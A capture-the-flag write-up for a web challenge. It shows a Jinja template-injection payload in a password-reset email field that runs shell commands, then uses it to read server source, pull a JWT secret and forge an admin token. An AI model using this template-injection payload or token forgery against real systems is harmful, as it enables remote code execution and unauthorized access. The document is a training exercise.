# WX01
> 1,000pts

## Briefing
> Access the url at: https://cfta-wx01.allyourbases.co and find a way to login to the admin portal to get the flag.

> Note: You have been provided with the following credentials to help you:

> username: `tim`

> password: `berners-lee`

## Solution
View the web requests to see that authorisation is done using a JWT token

### Getting Started
A `POST` request to `https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01` with the following body is sent:
```json
{
    "action": "login",
    "username": "tim",
    "password": "berners-lee"
}
```

This returns a JWT token that contains the user and role
```json
{
    "statusCode": 200,
    "body": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJ1c2VyIn0.j8wX114OSLEo2I4S6GQ4wQ4ZszXtyp0wFc0lpwc1yRQ"
}
```
... which is signed using `HS256` to
```json
{
    "username": "tim",
    "role": "user"
}
```

We need to change the `role` to `admin`, but we'll need the JWT secret key to resign the payload.

### Obtaining the Secret Key
Notice that the password reset form makes a `POST` request to `https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01` with the body:
```json
{
    "action": "help",
    "email": "test@example.com"
}
```
```json
{
    "statusCode": 200,
    "body": "\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: test@example.com</p>\n    <p>This might take a reaaaaaaally long time though (forever).</p>\n    "
}
```

After messing with the `email` field, discover that it is vulnerable to using a Jinja templating string.

We can pop a shell using the body:
```json
{
    "action": "help",
    "email": "{{globals().__builtins__.__import__('os').popen('[ commmand ]').read()}}"
}
```

...which then means we can get the source by sending
```json
{
    "action": "help",
    "email": "{{globals().__builtins__.__import__('os').popen('cat lambda_function.py').read()}}"
}
```
```json
{
    "statusCode": 200,
    "body": "\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: from jinja2 import Template\nimport json\nimport urllib\nimport jwt\nimport os\n\n# JWT Key\nkey = \"aversion-chute-freeway-corporal\"\nalgo = \"HS256\"\n\ndef getHelp(event):\n    email = ''.join(event['email'])\n    template = \"\"\"\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: %s</p>\n    <p>This might take a reaaaaaaally long time though (forever).</p>\n    \"\"\" % (urllib.parse.unquote(email).replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\"))\n    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)\n    msg = msg[:-len(msg)+700]\n    return msg\n\ndef login(event)"
}
```

This gives us the JWT key, `aversion-chute-freeway-corporal`

### Logging In
CyberChef can be used to sign the following payload with the `HS256` algorithm and secret key `aversion-chute-freeway-corporal`:
```json
{
    "username": "tim",
    "role": "admin"
}
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNzc5NzI0OX0.rRYKHKlanDexPgprltGyAvfjVoSyqSpLUIkR13_qcT4
```

This token just needs to be sent as a `verify` action obtain the flag:
```json
{
    "action": "verify",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNzc5NjcwNH0.AIRho1XtNkBU0iKhlWuPgEaaHf3IWmokEv4mNhnuAfE"
}
```
```json
{
    "statusCode": 200,
    "body": "muLtiStagingIT710-12"
}
```

## Flag
Flag: `muLtiStagingIT710-12`
